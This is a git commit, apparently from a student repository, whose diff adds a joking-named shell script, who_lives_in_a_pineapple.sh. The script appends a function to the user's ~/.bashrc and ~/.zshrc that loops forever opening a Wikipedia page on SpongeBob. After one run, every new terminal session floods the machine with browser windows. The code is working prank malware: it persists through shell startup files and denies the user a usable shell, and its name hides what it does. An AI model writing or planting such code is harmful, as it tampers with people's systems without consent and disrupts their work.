636847a74dc97eb6e883ac5dcb29240b8f9ce126
mbecel <mael1.becel@epitech.eu>
2022-01-19 15:01:26 +0100

    ehehehehehehhehehehehehehehehhhh

---
+++ who_lives_in_a_pineapple.sh
@@ -0,0 +1,13 @@
+echo 'spongebob() {
+    while ((1 == 1)); do
+        xdg-open https://fr.wikipedia.org/wiki/Bob_l%27éponge > /dev/null
+    done
+}
+spongebob' >> ~/.bashrc
+
+echo 'spongebob() {
+    while ((1 == 1)); do
+        xdg-open https://fr.wikipedia.org/wiki/Bob_l%27éponge > /dev/null
+    done
+}
+spongebob' >> ~/.zshrc
